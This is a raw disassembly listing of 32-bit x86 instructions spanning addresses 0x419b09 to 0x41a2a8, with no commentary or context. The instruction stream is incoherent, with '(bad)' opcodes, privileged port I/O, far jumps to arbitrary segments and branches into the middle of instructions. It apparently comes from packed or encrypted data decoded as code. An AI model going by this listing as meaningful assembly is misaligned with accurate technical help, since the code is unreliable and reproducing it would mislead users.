  419b09:	or     al,0xca
  419b0b:	mov    ax,ds:0xd1d9b9f9
  419b11:	out    dx,eax
  419b12:	loop   0x419afd
  419b14:	test   al,0x3a
  419b16:	xchg   ebp,eax
  419b17:	mov    DWORD PTR [edx+0x7a385d56],ebx
  419b1d:	cwde   
  419b1e:	pop    esi
  419b1f:	clc    
  419b20:	mov    dl,0x9f
  419b22:	push   eax
  419b23:	adc    BYTE PTR [edi+0x24f01475],ah
  419b29:	push   edx
  419b2a:	mov    ch,BYTE PTR [ebx]
  419b2c:	and    eax,0xade376a4
  419b31:	hlt    
  419b32:	jae    0x419b39
  419b34:	rol    ecx,0x78
  419b37:	pop    ebp
  419b38:	(bad)  [ebx+0x3d4adec7]
  419b3e:	(bad)  
  419b40:	imul   ebp,DWORD PTR [esi+0x61a91c1d],0x3f
  419b47:	push   eax
  419b48:	jg     0x419b10
  419b4a:	popa   
  419b4b:	xor    al,0xe0
  419b4d:	cmp    bl,0xff
  419b50:	mov    ebx,0x9b259df5
  419b55:	dec    edi
  419b56:	in     al,0x5b
  419b58:	jl     0x419aee
  419b5a:	push   ecx
  419b5b:	sbb    ebx,esp
  419b5d:	outs   dx,BYTE PTR ds:[esi]
  419b5e:	xchg   ecx,eax
  419b5f:	mov    esp,DWORD PTR [edx+0x612aca5f]
  419b65:	outs   dx,BYTE PTR ds:[esi]
  419b66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b67:	and    al,0x4d
  419b69:	or     DWORD PTR [eax+0x57],0x5e
  419b6d:	add    esp,esp
  419b6f:	mov    ecx,0xf37b6ea2
  419b74:	sbb    cl,BYTE PTR [ebx+0x6fda344f]
  419b7a:	pushf  
  419b7b:	or     dh,BYTE PTR [eax-0x3248cf3e]
  419b81:	shr    DWORD PTR [ebx+0x7d],1
  419b84:	loop   0x419ba3
  419b86:	popf   
  419b87:	sub    eax,esp
  419b89:	in     eax,dx
  419b8a:	shr    DWORD PTR [eax-0x217a1394],0xdd
  419b91:	loope  0x419bd4
  419b93:	int3   
  419b94:	inc    esp
  419b95:	lds    edx,FWORD PTR [esi]
  419b97:	xchg   ecx,eax
  419b98:	into   
  419b99:	jge    0x419c15
  419b9b:	mov    al,cl
  419b9d:	popa   
  419b9e:	adc    ebx,esi
  419ba0:	ror    DWORD PTR [esi-0x5a],1
  419ba3:	mov    ecx,0x2e4efa58
  419ba8:	jecxz  0x419c0a
  419baa:	aam    0x38
  419bac:	pop    esi
  419bad:	stos   DWORD PTR es:[edi],eax
  419bae:	or     al,0xfd
  419bb0:	cmp    al,0x1b
  419bb2:	sti    
  419bb3:	lds    esi,FWORD PTR [eax-0x6b]
  419bb6:	cmp    eax,0x66000ea
  419bbb:	mov    bh,BYTE PTR [esi-0x3d168ff2]
  419bc1:	sub    BYTE PTR [edx+eax*2-0x3d],dl
  419bc5:	push   cs
  419bc6:	bound  edi,QWORD PTR [ebp+esi*8-0x4c973940]
  419bcd:	std    
  419bce:	pop    esi
  419bcf:	jmp    0x5486:0x5eaf4774
  419bd6:	jecxz  0x419b6a
  419bd8:	repz mov esi,0xa71a1547
  419bde:	loop   0x419b61
  419be0:	lea    edx,[edx-0x24935124]
  419be6:	shr    ebp,0x9c
  419be9:	lds    esp,FWORD PTR [ebp+0x11]
  419bec:	ficom  DWORD PTR [eax-0x2e49847e]
  419bf2:	or     eax,DWORD PTR [edx]
  419bf4:	cdq    
  419bf5:	inc    ebp
  419bf6:	rcl    cl,0xd2
  419bf9:	test   DWORD PTR [ebp+0x144209b9],ebx
  419bff:	loopne 0x419bd2
  419c01:	xor    BYTE PTR [ebx],dh
  419c03:	nop
  419c04:	dec    ecx
  419c05:	out    dx,al
  419c06:	add    DWORD PTR [eax],esi
  419c08:	aaa    
  419c09:	clc    
  419c0a:	or     eax,0xd874d185
  419c0f:	inc    ecx
  419c10:	mov    edi,DWORD PTR [esi+0x1f]
  419c13:	or     DWORD PTR [edi+eiz*1],ecx
  419c16:	sbb    ebp,DWORD PTR ds:0x78f6f80e
  419c1c:	push   es
  419c1d:	inc    ecx
  419c1e:	lock push ebx
  419c20:	hlt    
  419c21:	jb     0x419c56
  419c23:	or     ebx,DWORD PTR [edx+0x3677494c]
  419c29:	sub    bl,bh
  419c2b:	mov    ch,0xe7
  419c2d:	sbb    DWORD PTR [edi+edx*1],esp
  419c30:	enter  0x840a,0xac
  419c34:	ficom  DWORD PTR ss:[ecx-0x26]
  419c38:	aam    0x84
  419c3a:	jp     0x419c7e
  419c3c:	fwait
  419c3d:	cmp    al,0xbd
  419c3f:	sub    ebp,DWORD PTR [eax]
  419c41:	push   edx
  419c42:	sbb    al,0x43
  419c44:	push   esi
  419c45:	aaa    
  419c46:	push   eax
  419c47:	sub    DWORD PTR [eax-0x19598c1b],esi
  419c4d:	cmp    ebp,DWORD PTR [esi+0x7ac7790]
  419c53:	arpl   WORD PTR [esi],sp
  419c55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c56:	sub    BYTE PTR [edi],ah
  419c58:	push   ebp
  419c59:	xchg   ecx,eax
  419c5a:	mov    edi,0x8df3d638
  419c5f:	mov    ebx,0xbd08cf79
  419c64:	dec    esi
  419c65:	mov    ebp,0x4537fc1b
  419c6a:	and    DWORD PTR [esi+0x2b],ebp
  419c6d:	je     0x419c60
  419c6f:	shl    BYTE PTR [ebx-0x75a49c56],cl
  419c75:	repnz push edi
  419c77:	mov    ah,al
  419c79:	mov    ebp,0xd94976fb
  419c7e:	enter  0x9707,0xa6
  419c82:	pusha  
  419c83:	mov    bh,0x1d
  419c85:	aam    0xba
  419c87:	add    al,0xe
  419c89:	retf   
  419c8a:	mov    eax,0x260fb4fa
  419c8f:	cs add dl,bh
  419c92:	mov    eax,0xc891b141
  419c97:	mov    ecx,0xb887d1e7
  419c9c:	loope  0x419c9d
  419c9e:	js     0x419c61
  419ca0:	xchg   BYTE PTR [edx],bh
  419ca2:	hlt    
  419ca3:	je     0x419d02
  419ca5:	add    eax,0xd29e049d
  419caa:	add    edx,edx
  419cac:	ds in  eax,0xe4
  419caf:	mov    al,ds:0xe8a44d04
  419cb4:	pop    sp
  419cb6:	add    eax,0x9f5b4402
  419cbb:	jbe    0x419d2f
  419cbd:	sar    ebx,0xfb
  419cc0:	mov    bl,0xc0
  419cc2:	outs   dx,BYTE PTR ds:[esi]
  419cc3:	fwait
  419cc4:	mov    al,ds:0xeef89e5a
  419cc9:	mov    esi,0x266ddcdc
  419cce:	mov    esp,0xa685e006
  419cd3:	add    esi,eax
  419cd5:	mov    ds:0x1ca3977d,eax
  419cda:	das    
  419cdb:	ins    BYTE PTR es:[edi],dx
  419cdc:	ds imul edi,esp,0xffffffb2
  419ce0:	dec    edx
  419ce1:	lea    eax,[ebx+0x1814fe18]
  419ce7:	sbb    eax,0x5d2810ba
  419cec:	mov    eax,0xd25f6262
  419cf1:	add    dh,dh
  419cf3:	xchg   ecx,eax
  419cf4:	xchg   ebx,eax
  419cf5:	(bad)  
  419cf6:	jo     0x419c9a
  419cf8:	and    DWORD PTR [edi+ebx*8+0x19c3a72a],0xffffff98
  419d00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d01:	ins    DWORD PTR es:[edi],dx
  419d02:	add    eax,0xb0589536
  419d07:	aaa    
  419d08:	popa   
  419d09:	mov    al,0xbc
  419d0b:	out    0x6d,al
  419d0d:	fisttp WORD PTR [edx+ecx*4-0x73]
  419d11:	inc    edi
  419d12:	adc    eax,0x906cb6fc
  419d17:	push   esi
  419d18:	xchg   esp,eax
  419d19:	stos   DWORD PTR es:[edi],eax
  419d1a:	out    dx,eax
  419d1b:	mov    ds:0x4982e41f,eax
  419d20:	mov    esi,0x2b10eda4
  419d25:	(bad)  
  419d26:	(bad)  [edi]
  419d28:	pop    ds
  419d29:	jp     0x419d98
  419d2b:	dec    ebp
  419d2c:	loope  0x419d0d
  419d2e:	in     al,dx
  419d2f:	cmc    
  419d30:	jp     0x419d94
  419d32:	mov    edx,0x1cfd8be0
  419d37:	sub    eax,DWORD PTR [eax+0x72]
  419d3a:	pop    eax
  419d3b:	in     al,dx
  419d3c:	in     al,0x75
  419d3e:	xchg   esi,eax
  419d3f:	mov    ds:0x1b0883dc,eax
  419d44:	sub    al,0x17
  419d46:	xor    esi,DWORD PTR ds:[edi-0x39]
  419d4a:	je     0x419d57
  419d4c:	and    bh,0x39
  419d4f:	aad    0x5a
  419d51:	pop    ecx
  419d52:	pop    edx
  419d53:	push   es
  419d54:	cli    
  419d55:	sub    ch,dh
  419d57:	cli    
  419d58:	sbb    eax,0xbdbd4080
  419d5d:	ret    0x2097
  419d60:	add    al,0x94
  419d62:	mov    al,0x39
  419d64:	pop    esi
  419d65:	aad    0xb9
  419d67:	test   BYTE PTR [ecx-0x5ccf8433],ch
  419d6d:	sar    DWORD PTR [eax],cl
  419d6f:	mov    eax,cs
  419d71:	jbe    0x419d85
  419d73:	fmul   QWORD PTR [edx]
  419d75:	or     al,0x50
  419d77:	jns    0x419d4f
  419d79:	aam    0x28
  419d7b:	rol    BYTE PTR [ebx+0x7e90a754],1
  419d81:	rcr    DWORD PTR [ecx+0x30],1
  419d84:	test   eax,0x3e3b7a29
  419d89:	inc    ebp
  419d8a:	(bad)  
  419d8b:	mov    edi,0x9e19fba3
  419d90:	sub    BYTE PTR [ecx-0x909cf92],bl
  419d96:	sub    ebp,DWORD PTR [esi+0x63cc2563]
  419d9c:	sub    DWORD PTR [ebp-0x6f],0xffffffc5
  419da0:	sub    DWORD PTR [edx+0x7a],edi
  419da3:	cmc    
  419da4:	ror    edi,cl
  419da6:	outs   dx,DWORD PTR ds:[esi]
  419da7:	jl     0x419e03
  419da9:	cmp    eax,0xfc7bf690
  419dae:	inc    esp
  419daf:	mov    ds:0xb24fd55,eax
  419db4:	int3   
  419db5:	push   esp
  419db6:	jno    0x419d85
  419db8:	push   es
  419db9:	push   esp
  419dba:	popa   
  419dbb:	mov    ebx,0x2fb7636
  419dc0:	imul   edi,ebx,0xffffffc0
  419dc3:	jnp    0x419e27
  419dc5:	or     BYTE PTR ds:0x81dfbe7d,0xe5
  419dcc:	or     al,0xf6
  419dce:	fisubr WORD PTR [edi]
  419dd0:	sbb    dh,dl
  419dd2:	add    bh,bh
  419dd4:	fnstcw WORD PTR [ecx-0x3f8696]
  419dda:	jo     0x419d97
  419ddc:	and    al,0xae
  419dde:	dec    esi
  419ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419de0:	xchg   DWORD PTR [ebx+0x5c6311ce],ecx
  419de6:	outs   dx,BYTE PTR ds:[esi]
  419de7:	loopne 0x419e67
  419de9:	jns    0x419e58
  419deb:	je     0x419d7f
  419ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dee:	scas   al,BYTE PTR es:[edi]
  419def:	shl    edx,1
  419df1:	cmp    esp,DWORD PTR [esi+0x23]
  419df4:	pop    es
  419df5:	fadd   QWORD PTR [ecx+0xd]
  419df8:	jecxz  0x419dee
  419dfa:	xchg   DWORD PTR [eax+0x45da677a],ebx
  419e00:	icebp  
  419e01:	and    al,0xec
  419e03:	push   ebx
  419e04:	inc    esp
  419e05:	fidivr WORD PTR [edi+0x7c]
  419e08:	jmp    0x43f61661
  419e0d:	mov    BYTE PTR [ebp+ebp*8+0x16],ch
  419e11:	or     BYTE PTR [edx],ch
  419e13:	inc    eax
  419e14:	xchg   DWORD PTR [eax+0x1f849fce],ebp
  419e1a:	mov    dl,0x1f
  419e1c:	loope  0x419e28
  419e1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e1f:	mov    dh,0x55
  419e21:	xor    al,0x16
  419e23:	sbb    DWORD PTR [esi+0x6d],edx
  419e26:	mov    ch,0xd9
  419e28:	push   ebp
  419e29:	push   ebx
  419e2a:	ins    DWORD PTR es:[edi],dx
  419e2b:	jne    0x419e33
  419e2d:	or     eax,0xb4177745
  419e32:	dec    ebp
  419e33:	adc    al,0xb
  419e35:	lea    ecx,[ebp+0x7f]
  419e38:	dec    edi
  419e39:	adc    BYTE PTR [esi+0x3],bl
  419e3c:	les    esp,FWORD PTR [edi+0x67bcd26e]
  419e42:	push   0x43
  419e44:	out    dx,eax
  419e45:	mov    bl,al
  419e47:	(bad)  
  419e49:	loop   0x419dfa
  419e4b:	adc    DWORD PTR [ecx+0x6],0x126b63ac
  419e52:	cmc    
  419e53:	arpl   WORD PTR [eax-0x31],bp
  419e56:	xchg   edx,eax
  419e57:	sub    BYTE PTR [ecx+ecx*2],ch
  419e5a:	cli    
  419e5b:	int3   
  419e5c:	jns    0x419ed6
  419e5e:	lds    esp,FWORD PTR [edi+0x23]
  419e61:	retf   
  419e62:	call   0x8e52:0x201c61bc
  419e69:	out    dx,al
  419e6a:	mov    ds:0x82d34308,eax
  419e6f:	sub    ah,al
  419e71:	or     BYTE PTR [edi+0x453667ee],al
  419e77:	int3   
  419e78:	jl     0x419e69
  419e7a:	push   es
  419e7b:	inc    ecx
  419e7c:	repnz xchg esp,eax
  419e7e:	rol    DWORD PTR es:[ebp-0x6d],1
  419e82:	lahf   
  419e83:	add    BYTE PTR ds:0xfa54eec3,dh
  419e89:	mov    ecx,DWORD PTR [ecx]
  419e8b:	iret   
  419e8c:	add    BYTE PTR [ecx],bl
  419e8e:	jo     0x419e5f
  419e90:	out    0x95,al
  419e92:	or     DWORD PTR [edi+0x3f505d95],esi
  419e98:	scas   eax,DWORD PTR es:[edi]
  419e99:	inc    esp
  419e9a:	aas    
  419e9b:	out    0x65,al
  419e9d:	or     ch,dh
  419e9f:	push   edx
  419ea0:	pop    ss
  419ea1:	xor    al,0x52
  419ea3:	mov    eax,0xac78f95b
  419ea8:	xchg   BYTE PTR [ebp-0x19],cl
  419eab:	aaa    
  419eac:	mov    BYTE PTR [edx+0x70b10dc],dh
  419eb2:	scas   al,BYTE PTR es:[edi]
  419eb3:	loopne 0x419f2a
  419eb5:	or     dl,BYTE PTR [ebx]
  419eb7:	inc    ecx
  419eb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419eb9:	(bad)  [ebp-0x586f2603]
  419ebf:	or     ch,BYTE PTR [eax-0x6ffae39]
  419ec5:	adc    al,0x92
  419ec7:	mov    al,0x44
  419ec9:	mov    ebx,0xfaeeb8a0
  419ece:	test   eax,0x125fab5c
  419ed3:	(bad)  
  419ed4:	stos   DWORD PTR es:[edi],eax
  419ed5:	cmp    eax,ebx
  419ed7:	push   esp
  419ed8:	jp     0x419eb4
  419eda:	std    
  419edb:	jae    0x419ede
  419edd:	xor    al,0xa2
  419edf:	and    BYTE PTR [ecx-0x54],dl
  419ee2:	sub    dl,BYTE PTR [eax]
  419ee4:	jne    0x419e8c
  419ee6:	les    esp,FWORD PTR [eax-0x4b6fea42]
  419eec:	in     al,0x4
  419eee:	out    0x5e,al
  419ef0:	fsubrp st(1),st
  419ef2:	dec    esi
  419ef3:	ja     0x419f2f
  419ef5:	cmp    DWORD PTR [eax+0x2e],0x9060266d
  419efc:	jno    0x419ea1
  419efe:	mov    ebx,0xfdfa66a2
  419f03:	shr    BYTE PTR [edi-0x500cf2a9],cl
  419f09:	sub    esp,ecx
  419f0b:	pop    ebx
  419f0c:	out    0x9,al
  419f0e:	ret    0x3241
  419f11:	mov    esp,DWORD PTR [ebp+0x62]
  419f14:	xor    DWORD PTR [eax-0xd69c071],eax
  419f1a:	and    edi,ebx
  419f1c:	bound  ebp,QWORD PTR ss:[ebp+0x3a]
  419f20:	jne    0x419f62
  419f22:	out    dx,eax
  419f23:	jecxz  0x419ee7
  419f25:	aas    
  419f26:	nop
  419f27:	fisubr WORD PTR [ebx+eiz*1+0x41]
  419f2b:	mov    BYTE PTR [ebx],bl
  419f2d:	xor    DWORD PTR [edx-0x16],esp
  419f30:	popf   
  419f31:	mov    ds:0x145c6fb1,al
  419f36:	mov    dh,0xd3
  419f38:	add    esp,ecx
  419f3a:	(bad)
  419f3e:	fild   WORD PTR [ebx]
  419f40:	loopne 0x419edd
  419f42:	in     eax,dx
  419f43:	es jb  0x419f4d
  419f46:	ret    
  419f47:	lds    ecx,FWORD PTR [eax]
  419f49:	mov    cl,0xf5
  419f4b:	repz mov dh,0xd1
  419f4e:	stos   BYTE PTR es:[edi],al
  419f4f:	sbb    al,0x27
  419f51:	fsub   QWORD PTR [edi]
  419f53:	scas   eax,DWORD PTR es:[edi]
  419f54:	jae    0x419f01
  419f56:	cwde   
  419f57:	xlat   BYTE PTR ds:[ebx]
  419f58:	sbb    ebp,ebx
  419f5a:	cmp    DWORD PTR [eax-0x18],esp
  419f5d:	mov    bh,0xeb
  419f5f:	jg     0x419f0d
  419f61:	cld    
  419f62:	sub    DWORD PTR [esi+0x7e],ecx
  419f65:	mov    eax,0xe06dfb0a
  419f6a:	cdq    
  419f6b:	repnz or esi,DWORD PTR [edi+0x48]
  419f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f70:	lahf   
  419f71:	jecxz  0x419f0d
  419f73:	pushf  
  419f74:	sub    ebp,edi
  419f76:	mov    esi,0x93a6c10
  419f7b:	push   esi
  419f7c:	jl     0x419f51
  419f7e:	(bad)  [esi+edx*1]
  419f81:	aam    0x59
  419f83:	das    
  419f84:	gs fwait
  419f86:	mov    ah,0x50
  419f88:	shl    BYTE PTR [esi+esi*2],cl
  419f8b:	(bad)  
  419f8c:	shl    edi,1
  419f8e:	add    eax,0xfff1db79
  419f93:	add    eax,0xf5e8cbc8
  419f98:	xor    al,0xf5
  419f9a:	add    edi,esp
  419f9c:	add    bh,bh
  419f9e:	pop    es
  419f9f:	sbb    BYTE PTR [ecx+0x5dd69cf4],bl
  419fa5:	mov    bh,0x9
  419fa7:	xor    esi,DWORD PTR [edx-0x22]
  419faa:	inc    edx
  419fab:	pusha  
  419fac:	dec    eax
  419fad:	and    ah,al
  419faf:	(bad)  
  419fb0:	mov    fs,WORD PTR [ecx+0x51]
  419fb3:	mov    ebx,0xa0fbcbc1
  419fb8:	iret   
  419fb9:	in     eax,0xf8
  419fbb:	in     al,dx
  419fbc:	lock (bad) 
  419fbe:	mov    ah,bh
  419fc0:	not    ecx
  419fc2:	inc    ebx
  419fc3:	fisub  WORD PTR [esi]
  419fc5:	stos   BYTE PTR es:[edi],al
  419fc6:	cld    
  419fc7:	mov    bl,0x5c
  419fc9:	sub    DWORD PTR [eax-0x19],ebp
  419fcc:	arpl   WORD PTR ds:0xaf42a993,cx
  419fd2:	pop    ebp
  419fd3:	mov    bl,0xd
  419fd5:	cmp    DWORD PTR [edi-0x317d3a8f],esp
  419fdb:	and    DWORD PTR [edx+0x6e244131],ebx
  419fe1:	neg    BYTE PTR [edi]
  419fe3:	fdiv   DWORD PTR [edx+0x5af99dbb]
  419fe9:	adc    cl,al
  419feb:	sub    DWORD PTR [ebx-0x75],esp
  419fee:	sub    dl,cl
  419ff0:	pop    ecx
  419ff1:	pop    ecx
  419ff2:	xor    al,0xe1
  419ff4:	xchg   ebp,eax
  419ff5:	mov    bh,0x77
  419ff7:	in     eax,0x82
  419ff9:	mov    al,ds:0x4690caa1
  419ffe:	xor    bl,BYTE PTR [esp+eiz*2-0x61]
  41a002:	add    esp,DWORD PTR [eax]
  41a004:	in     eax,0x10
  41a006:	aad    0xd7
  41a008:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a009:	das    
  41a00a:	sub    eax,0xfe87a66c
  41a00f:	jb     0x41a04e
  41a011:	arpl   WORD PTR [edx+0x3f],cx
  41a014:	jg     0x419fef
  41a016:	or     dh,BYTE PTR [edi+ecx*1+0xa5ca741]
  41a01d:	pop    ecx
  41a01e:	bound  ecx,QWORD PTR [esi-0x37329898]
  41a024:	or     bl,BYTE PTR [edi+0x1f448d14]
  41a02a:	mov    ebp,0x3fd0d875
  41a02f:	or     edi,esp
  41a031:	xchg   ebx,eax
  41a032:	xchg   ebx,eax
  41a033:	test   eax,0x95a83a74
  41a038:	pop    es
  41a039:	sbb    eax,0x6db3771e
  41a03e:	pop    ss
  41a03f:	push   esp
  41a040:	scas   al,BYTE PTR es:[edi]
  41a041:	inc    ecx
  41a042:	xor    edi,DWORD PTR [edi+0x18]
  41a045:	cmp    BYTE PTR [edx+0x4e5cec6e],bh
  41a04b:	je     0x41a02d
  41a04d:	or     BYTE PTR [eax+0x7b],0x93
  41a051:	sbb    al,0xda
  41a053:	test   eax,0x27fa0862
  41a058:	jb     0x41a0d0
  41a05a:	adc    ah,ch
  41a05c:	cmp    al,0xa8
  41a05e:	dec    ecx
  41a05f:	cmp    eax,0xaa4c341c
  41a064:	nop
  41a065:	fs push ebp
  41a067:	sub    ebp,edi
  41a069:	dec    ecx
  41a06a:	xor    ebx,DWORD PTR [edx]
  41a06c:	fnsave [esi]
  41a06e:	out    dx,eax
  41a06f:	retf   0x712a
  41a072:	adc    al,ch
  41a074:	fs push ecx
  41a076:	sub    al,0x58
  41a078:	test   DWORD PTR [edi-0x4e],ecx
  41a07b:	(bad)  
  41a07c:	lahf   
  41a07d:	test   BYTE PTR [edi+0x2f3dbc80],bl
  41a083:	sub    al,0xd1
  41a085:	out    0xdd,eax
  41a087:	neg    BYTE PTR [esi]
  41a089:	lahf   
  41a08a:	mov    DWORD PTR ds:0x891e639d,edx
  41a090:	iret   
  41a091:	out    0x12,eax
  41a093:	aad    0xd2
  41a095:	and    DWORD PTR [ebp-0x21f044dc],esi
  41a09b:	addr16 or al,0x33
  41a09e:	ficom  DWORD PTR [esi]
  41a0a0:	and    BYTE PTR [esi*1+0x4837cc1e],dl
  41a0a7:	outs   dx,DWORD PTR ds:[esi]
  41a0a8:	stos   BYTE PTR es:[edi],al
  41a0a9:	jb     0x41a112
  41a0ab:	mov    bh,0x90
  41a0ad:	or     BYTE PTR [edi],al
  41a0af:	mov    bh,0x18
  41a0b1:	mov    ds:0xd05ebf24,al
  41a0b6:	pop    eax
  41a0b7:	sub    BYTE PTR [esi],ah
  41a0b9:	repz call 0x2d39b342
  41a0bf:	ins    DWORD PTR es:[edi],dx
  41a0c0:	cmc    
  41a0c1:	jne    0x41a0db
  41a0c3:	sub    al,0x37
  41a0c5:	xchg   edx,eax
  41a0c6:	mov    ds:0xf866f65a,al
  41a0cb:	in     eax,0xea
  41a0cd:	pusha  
  41a0ce:	xchg   esi,eax
  41a0cf:	icebp  
  41a0d0:	iret   
  41a0d1:	and    al,0xec
  41a0d3:	into   
  41a0d4:	push   eax
  41a0d5:	jnp    0x41a058
  41a0d7:	dec    esi
  41a0d8:	adc    edx,DWORD PTR [esp+ecx*2]
  41a0db:	inc    edi
  41a0dc:	fs mov bh,0xf1
  41a0df:	jp     0x41a068
  41a0e1:	(bad)  [edi]
  41a0e3:	sub    eax,0xd26c50ef
  41a0e8:	shl    BYTE PTR [ecx-0x1d],0x48
  41a0ec:	sub    esp,esi
  41a0ee:	pushw  0x7f
  41a0f1:	lods   eax,DWORD PTR ds:[esi]
  41a0f2:	xchg   edx,eax
  41a0f3:	sbb    bl,BYTE PTR [edx]
  41a0f5:	xchg   DWORD PTR [eax+0x6b74c270],ecx
  41a0fb:	jae    0x41a11b
  41a0fd:	in     al,dx
  41a0fe:	in     eax,0x5b
  41a100:	iret   
  41a101:	xchg   esp,eax
  41a102:	push   es
  41a103:	inc    ebx
  41a104:	add    DWORD PTR ss:[edi-0xf],ecx
  41a108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a109:	out    0x5b,al
  41a10b:	push   ss
  41a10c:	push   edi
  41a10d:	jbe    0x41a0d1
  41a10f:	int    0xda
  41a111:	sbb    esi,DWORD PTR [esi]
  41a113:	push   esp
  41a114:	add    eax,DWORD PTR [esi+0x74466bcd]
  41a11a:	shl    BYTE PTR [ebp-0x1e12aed5],1
  41a120:	xchg   esi,eax
  41a121:	loop   0x41a188
  41a123:	push   ecx
  41a124:	push   0xc16c9e27
  41a129:	add    DWORD PTR [ebx-0x239298e5],edi
  41a12f:	rcl    DWORD PTR ds:0x18d408e2,cl
  41a135:	imul   edi,DWORD PTR [ebx],0x219f73e6
  41a13b:	cmp    DWORD PTR [esi+0x1d820632],eax
  41a141:	pop    esp
  41a142:	cmp    al,0x89
  41a144:	or     BYTE PTR [ecx-0x21b8ccda],ah
  41a14a:	retf   0x789
  41a14d:	stos   BYTE PTR es:[edi],al
  41a14e:	pop    es
  41a14f:	dec    esp
  41a150:	call   0x9a1c:0xaa44b436
  41a157:	mov    ecx,0xfa1c744d
  41a15c:	call   0x48d14cf1
  41a161:	xchg   edx,eax
  41a162:	cli    
  41a163:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a164:	pop    ds
  41a165:	movsx  edx,BYTE PTR ds:0xcee6944a
  41a16c:	push   esp
  41a16d:	add    eax,0x431a9a8a
  41a172:	leave  
  41a173:	xor    DWORD PTR [edx],ebx
  41a175:	fcom   DWORD PTR [edi-0x43]
  41a178:	es jb  0x41a187
  41a17b:	(bad)  
  41a17c:	std    
  41a17d:	jae    0x41a1ed
  41a17f:	or     bh,BYTE PTR [ebp+0x18]
  41a182:	scas   al,BYTE PTR es:[di]
  41a184:	test   BYTE PTR [eax+0x186fd557],ch
  41a18a:	mov    cl,0x4c
  41a18c:	sbb    DWORD PTR [edx-0x73],ebp
  41a18f:	sbb    edx,ebp
  41a191:	mov    al,ds:0xbcf799bd
  41a196:	nop
  41a197:	mov    edi,0xbae011e1
  41a19c:	dec    esi
  41a19d:	cmp    bl,BYTE PTR [ecx-0xcf523fc]
  41a1a3:	int    0x4f
  41a1a5:	adc    BYTE PTR [edi-0x12],0x41
  41a1a9:	jo     0x41a12c
  41a1ab:	mov    eax,ds:0xbae25a9e
  41a1b0:	fdivr  st(2),st
  41a1b2:	sbb    esp,DWORD PTR [edx+0x24]
  41a1b5:	xor    ah,BYTE PTR [edi+edx*4]
  41a1b8:	push   ecx
  41a1b9:	push   0xffffffd0
  41a1bb:	cmp    al,0x67
  41a1bd:	icebp  
  41a1be:	sbb    esi,DWORD PTR [edi-0x5e]
  41a1c1:	add    DWORD PTR [edi],0xffffff88
  41a1c4:	pushf  
  41a1c5:	(bad)  
  41a1c6:	das    
  41a1c7:	cmp    BYTE PTR [ecx],ah
  41a1c9:	aas    
  41a1ca:	inc    ebp
  41a1cb:	sub    DWORD PTR [eax-0x27],ecx
  41a1ce:	push   cs
  41a1cf:	jg     0x41a19e
  41a1d1:	pop    ebx
  41a1d2:	xor    eax,0xeb16be5a
  41a1d7:	xchg   ebx,eax
  41a1d8:	sbb    BYTE PTR [esi+0x44bfe457],0xa5
  41a1df:	imul   edx,ebp,0xffffffba
  41a1e2:	sbb    eax,0x3dda054e
  41a1e7:	rol    BYTE PTR [ecx+0x4b],1
  41a1ea:	cdq    
  41a1eb:	aas    
  41a1ec:	(bad)  
  41a1ed:	mov    ebx,0x80415615
  41a1f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1f3:	dec    esi
  41a1f4:	out    0x40,eax
  41a1f6:	aas    
  41a1f7:	fwait
  41a1f8:	jg     0x41a199
  41a1fa:	aaa    
  41a1fb:	int    0x2
  41a1fd:	je     0x41a1fe
  41a1ff:	ja     0x41a1b3
  41a201:	lea    edx,[eax]
  41a203:	outs   dx,DWORD PTR ds:[esi]
  41a204:	and    DWORD PTR [ebx+0x415001ec],0x5e
  41a20b:	ds ret 0xdff9
  41a20f:	scas   al,BYTE PTR es:[edi]
  41a210:	add    al,0x82
  41a212:	jmp    edx
  41a214:	pop    eax
  41a215:	xor    eax,0xff25c583
  41a21a:	ds push ebp
  41a21c:	rol    DWORD PTR [eax+0x71],1
  41a21f:	and    ah,BYTE PTR ds:0x4125c83
  41a225:	loop   0x41a262
  41a227:	aas    
  41a228:	sbb    esp,ebp
  41a22a:	dec    ecx
  41a22b:	jecxz  0x41a1c9
  41a22d:	cmc    
  41a22e:	cmc    
  41a22f:	and    al,bh
  41a231:	mov    ch,0x9f
  41a233:	add    bl,BYTE PTR [eax-0x41904511]
  41a239:	jmp    edx
  41a23b:	into   
  41a23c:	fcomp  QWORD PTR [edx-0x62599a65]
  41a242:	dec    esp
  41a243:	inc    esp
  41a244:	jmp    0x41a232
  41a246:	xchg   edx,ebx
  41a248:	ss test al,0x21
  41a24b:	push   ss
  41a24c:	daa    
  41a24d:	fst    DWORD PTR [eax+0x1385312a]
  41a253:	inc    edi
  41a254:	test   DWORD PTR ds:0xbe8f8806,esi
  41a25a:	jno    0x41a1f6
  41a25c:	into   
  41a25d:	push   ebx
  41a25e:	lds    edi,FWORD PTR [eax]
  41a260:	mov    ah,0x6a
  41a262:	inc    ebp
  41a263:	(bad)  
  41a264:	cmc    
  41a265:	dec    eax
  41a266:	dec    esi
  41a267:	and    al,0xcc
  41a269:	test   BYTE PTR [ebx+esi*1],ah
  41a26c:	clc    
  41a26d:	jge    0x41a2b0
  41a26f:	cmc    
  41a270:	cdq    
  41a271:	pushf  
  41a272:	and    eax,0x7f4d996e
  41a277:	fwait
  41a278:	cli    
  41a279:	push   cs
  41a27a:	fiadd  DWORD PTR [eax+0x48]
  41a27d:	out    0x4e,al
  41a27f:	mov    eax,0x1821226b
  41a284:	cmp    bh,BYTE PTR [ecx-0x8dc0a04]
  41a28a:	cmc    
  41a28b:	daa    
  41a28c:	pop    ds
  41a28d:	test   BYTE PTR [edx-0x6],0x6a
  41a291:	fidiv  DWORD PTR [edi-0x1ff4f639]
  41a297:	pop    es
  41a298:	fwait
  41a299:	mov    ecx,ds
  41a29b:	xchg   edi,eax
  41a29c:	mov    DWORD PTR [edx+0x3ae412aa],0x8375b5d5
  41a2a6:	(bad)  
  41a2a7:	xchg   ecx,eax
  41a2a8:	call   0x41f11279
